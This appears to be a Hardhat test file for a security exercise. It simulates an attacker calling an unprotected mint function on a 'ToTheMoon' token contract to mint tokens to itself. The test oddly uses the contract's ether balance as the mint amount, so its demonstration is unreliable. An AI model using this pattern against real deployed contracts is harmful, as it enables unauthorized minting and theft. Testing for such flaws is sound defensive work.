import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();

describe("Simulating ATTACK - ACCESS-CONTROL - MINT function",function(){
    
    let owner:any,attacker:any,user1:any;

    before(async function(){
        [owner,attacker,user1] = await ethers.getSigners();
        const ContractFactory = await ethers.getContractFactory("ToTheMoon",owner);
        this.vault = await ContractFactory.deploy(ethers.parseUnits("100000",18));
        await this.vault.waitForDeployment();

        await this.vault.connect(owner).mint(user1.address,ethers.parseUnits("1000",18));
        const user1Balance = await this.vault.balanceOf(user1.address);
        expect(user1Balance).to.be.equal(ethers.parseUnits("1000",18));
    });

    it("Attacking the Vault",async function(){
        this.vaultBalance = await ethers.provider.getBalance(this.vault.target);
        await this.vault.connect(attacker).mint(attacker.address,this.vaultBalance);
        this.attackerBalance = await this.vault.balanceOf(attacker.address);
        expect(this.attackerBalance).to.be.equal(this.vaultBalance);
    });

    after(async function(){
        expect(this.vaultBalance).to.be.equal(0);
    });

});